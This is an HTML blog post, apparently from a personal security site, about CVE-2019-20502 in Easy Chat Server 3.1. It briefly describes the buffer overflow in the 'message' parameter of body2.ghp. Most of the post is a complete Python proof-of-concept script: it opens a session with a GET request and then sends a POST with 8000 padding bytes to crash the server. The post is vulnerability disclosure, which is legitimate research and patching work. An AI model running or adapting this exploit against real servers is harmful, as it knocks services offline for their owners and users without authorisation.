@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>s1kr10s // EFS Easy Chat Server</title>
+  <link rel="shortcut icon" href="../images/icon.png">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+    :root { --green:#00ff41; --green-dim:#00b32c; --green-dark:#003b0f; --cyan:#00ffff; --bg:#000; --scanline:rgba(0,255,65,0.03); }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html { overflow-y:scroll; }
+    html,body { background:var(--bg); color:var(--green); font-family:'Share Tech Mono','Courier New',monospace; overflow-x:hidden; min-height:100vh; }
+    body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg,transparent,transparent 2px,var(--scanline) 2px,var(--scanline) 4px); pointer-events:none; z-index:9999; }
+    body::after { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:radial-gradient(ellipse at center,transparent 60%,rgba(0,0,0,0.85) 100%); pointer-events:none; z-index:9998; }
+    canvas#matrix { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.07; }
+    .wrapper { position:relative; z-index:10; max-width:1100px; margin:0 auto; padding:0 20px; }
+    nav { border-bottom:1px solid var(--green-dim); padding:12px 0; }
+    nav ul { list-style:none; display:flex; flex-wrap:wrap; gap:5px; align-items:center; }
+    nav ul li a { color:var(--green-dim); text-decoration:none; padding:4px 12px; border:1px solid transparent; font-size:0.9rem; letter-spacing:1px; transition:all 0.15s; }
+    nav ul li a:hover { color:var(--green); border-color:var(--green); text-shadow:0 0 8px var(--green); background:rgba(0,255,65,0.05); }
+    nav .brand { color:var(--green); font-size:1rem; letter-spacing:2px; text-shadow:0 0 10px var(--green); margin-right:auto; }
+    .page-header { padding:30px 0 5px; }
+    .prompt-line { color:var(--green); font-size:1.05rem; margin-bottom:25px; text-shadow:0 0 5px var(--green); }
+    .prompt-line .user { color:var(--cyan); text-shadow:0 0 8px var(--cyan); }
+    .prompt-line .path { color:var(--green-dim); }
+    .cursor { display:inline-block; width:9px; height:1em; background:var(--green); vertical-align:text-bottom; animation:blink 1s step-end infinite; box-shadow:0 0 8px var(--green); }
+    @keyframes blink { 50%{opacity:0;} }
+    .post-container { padding:5px 0 40px; }
+    .post-title { color:var(--green); font-size:1.3rem; text-shadow:0 0 8px var(--green); padding:10px 0 15px; letter-spacing:1px; }
+    .post-hr { border:none; border-top:1px solid var(--green-dark); margin:0 0 25px; }
+    .post-body { color:#c0d8c0; font-size:0.95rem; line-height:1.8; }
+    .post-body img { max-width:100%; height:auto; border-radius:4px; border:1px solid var(--green-dark); }
+    .post-body textarea, .post-body textarea.form-control { background:#030a03 !important; color:#00ff41 !important; border:1px solid var(--green-dark) !important; font-family:'Share Tech Mono','Courier New',monospace !important; font-size:0.78rem !important; padding:12px !important; width:100% !important; resize:none; line-height:1.5 !important; margin:5px 0; }
+    .post-body a { color:var(--cyan) !important; text-decoration:none; }
+    .post-body a:hover { text-shadow:0 0 6px var(--cyan); text-decoration:underline; }
+    footer { border-top:1px solid var(--green-dark); padding:20px 0; margin-top:20px; color:var(--green-dark); font-size:0.75rem; letter-spacing:1px; }
+    footer a { color:var(--green-dim); text-decoration:none; }
+    footer a:hover { color:var(--green); text-shadow:0 0 6px var(--green); }
+    ::-webkit-scrollbar { width:6px; background:#000; }
+    ::-webkit-scrollbar-thumb { background:var(--green-dark); }
+  </style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrapper">
+  <nav>
+    <ul>
+      <li><span class="brand">&gt; </span></li>
+      <li><a href="../index.html">[ ~/Start ]</a></li>
+      <li><a href="../whoami.html">[ ~/Whoami ]</a></li>
+      <li><a href="../ctf/ctf.html">[ ~/CTF's ]</a></li>
+    </ul>
+  </nav>
+  <div class="page-header">
+    <div class="prompt-line">
+      <span class="user">root</span>@<span class="host">pwn</span>:<span class="path">~/post</span>$ cat efs_chat.txt
+      <span class="cursor"></span>
+    </div>
+  </div>
+  <div class="post-container">
+    <h2 class="post-title">EFS Easy Chat Server — CVE-2019-20502</h2>
+    <hr class="post-hr">
+    <div class="post-body">
+      <p>
+        body2.ghp receives a variable called message, which allows a buffer to overflow to produce an application block
+        <br><br>
+        Description:<br>
+        1- First socket with (GET) generates a valid session to then do step 2.<br>
+        2- Second we send (POST) the data message in the variable to crashear the application
+        <br><br>
+        <img src="https://raw.githubusercontent.com/s1kr10s/EasyChatServer-DOS/master/poc.png" width="100%">
+        <br><br>
+        Video:<br>
+        <a href="https://www.youtube.com/watch?v=BlOi_-OxOYc" target="_blank">https://www.youtube.com/watch?v=BlOi_-OxOYc</a>
+        <br><br>
+        Code:<br>
+        <textarea rows="20" cols="100" disabled>
+#!/usr/bin/python
+#---------------------------------------------------------
+# Title: Easy Chat Server Version 3.1 (Remote DOS)
+# Date: 2019-05-07
+# Author: Miguel Mendez Z
+# Team: www.exploiting.cl
+# Vendor: http://www.echatserver.com
+# Software Link: http://www.echatserver.com/ecssetup.exe
+# Platforms: Windows
+# Version: 3.1
+# CVE: CVE-2019-20502
+# Tested on: Windows Windows 7_x86/7_x64 [eng]
+#---------------------------------------------------------
+#
+# 1- Primer socket con (GET) generamos una sesion valida para luego hacer el paso 2.
+# 2- Segundo enviamos (POST) la data en la variable message para crashear la aplicacion.
+
+import os, sys, socket
+from time import sleep
+
+ip = '127.0.0.1'
+padding = 'A' * 8000
+
+GET = (
+"GET /chat.ghp?username=1&password=&room=1&sex=1 HTTP/1.1\r\n"
+"User-Agent: Mozilla/4.0\r\n"
+"Host: "+str(ip)+":80\r\n"
+"Accept-Language: en-us\r\n"
+"Accept-Encoding: gzip, deflate\r\n"
+"Referer: http://"+str(ip)+"\r\n"
+"Connection: Keep-Alive\r\n\r\n"
+)
+
+try:
+  print "\n [*] Ejecutando payload GET (Creando Sesion) - length " + str(len(GET))
+  s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s1.connect((ip, 80))
+  s1.send(GET)
+  s1.recv(1024)
+  s1.close()
+except:
+  print "Sin conexion GET"
+
+sleep(3)
+
+POST = (
+"POST /body2.ghp?username=1&password=&room=1 HTTP/1.1\r\n"
+"Host: "+str(ip)+"\r\n"
+"User-Agent: Mozilla/4.0\r\n"
+"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+"Accept-Language: es-CL,en-US;q=0.5\r\n"
+"Accept-Encoding: gzip, deflate\r\n"
+"Referer: http://"+str(ip)+"/chatsubmit.ghp?username=1&password=&room=1\r\n"
+"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
+"staticname=%3A000539&tnewname=&msayinfo=1&mnewname=&mtowho=All&mfilters=0&mfont=0&mfcolor=1&elist=&seltype=Theme&msg=&Submit=Send&sc=on&notifysound=on&message="+str(padding)+"&chat_flag="
+)
+
+try:
+  print " [*] Ejecutando payload POST (Crashing) - length " + str(len(POST))
+  s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s2.connect((ip, 80))
+  s2.send(POST)
+  s2.recv(1024)
+  s2.close()
+except:
+  print "Sin conexion POST"
+        </textarea>
+      </p>
+    </div>
+  </div>
+  <footer>
+    <span>// &nbsp; root@pwn:~$ echo "The quieter you become, the more you are able to hear." &nbsp; // &nbsp;</span>
+    <a href="https://github.com/s1kr10s" target="_blank">github</a> &nbsp;|&nbsp;
+    <a href="https://x.com/s1kr10s" target="_blank">twitter/x</a> &nbsp;|&nbsp;
+    <a href="https://medium.com/@s1kr10s" target="_blank">medium</a>
+  </footer>
+</div>
+<script>
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+  resize(); window.addEventListener('resize', resize);
+  const chars = '01アイウエオカキクケコ<>{}[]\\!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  const fontSize = 13;
+  let cols = Math.floor(window.innerWidth / fontSize);
+  let drops = Array(cols).fill(1);
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#00ff41'; ctx.font = fontSize + 'px Share Tech Mono, monospace';
+    cols = Math.floor(canvas.width / fontSize);
+    if (drops.length < cols) drops = drops.concat(Array(cols - drops.length).fill(1));
+    for (let i = 0; i < cols; i++) {
+      const c = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(c, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 50);
+</script>
+</body>
+</html>
